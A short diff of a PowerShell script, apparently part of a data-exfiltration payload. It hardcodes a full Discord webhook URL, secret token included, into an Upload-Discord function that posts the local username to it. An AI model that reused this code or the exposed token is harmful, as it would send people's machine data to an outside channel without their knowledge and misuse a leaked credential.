@@ -1,6 +1,3 @@
-
-
-
 # Define the Upload-Discord function
 function Upload-Discord {
     [CmdletBinding()]
@@ -11,7 +8,7 @@ function Upload-Discord {
         [string]$text 
     )
 
-    $hookurl = "$dc"
+    $hookurl = "https://discord.com/api/webhooks/1171563379874340874/yWRq-Ehof2YQ3ycRswEtfDtSWc_ZJwcomxwhCGYxU8uubem_Llurm9yPW4sfJk7H6bMn"
 
     $Body = @{
         'username' = $env:username
